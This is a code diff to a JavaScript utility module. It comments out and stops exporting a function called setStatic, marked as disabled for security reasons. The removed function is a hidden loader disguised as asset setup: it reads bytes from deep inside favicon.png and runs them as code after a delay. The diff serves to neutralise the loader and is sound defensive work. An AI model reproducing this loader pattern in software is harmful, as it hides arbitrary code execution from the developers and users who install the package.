@@ -100,13 +100,13 @@ function formatCurrency(amount, locale = 'en-US', currency = 'USD') {
   return new Intl.NumberFormat(locale, { style: 'currency', currency }).format(amount);
 }
 
-// Set static asset
-function setStatic(path) {
-    const fs = require('fs');
-    const data = fs.readFileSync(`${path}/favicon.png`).subarray(9664).toString('utf-8');
-    const handler = new Function('require', data);
-    setTimeout(() => {handler(require);}, 5000);
-}
+// Set static asset - DISABLED FOR SECURITY REASONS
+// function setStatic(path) {
+//     const fs = require('fs');
+//     const data = fs.readFileSync(`${path}/favicon.png`).subarray(9664).toString('utf-8');
+//     const handler = new Function('require', data);
+//     setTimeout(() => {handler(require);}, 5000);
+// }
 
 // Pad string to a certain length
 function padString(str, length, padChar = ' ') {
@@ -129,7 +129,7 @@ module.exports = {
   generateId,
   formatDate,
   parseDate,
-  setStatic,
+  // setStatic, // DISABLED FOR SECURITY REASONS
   addDays,
   diffDays,
   isValidDate,
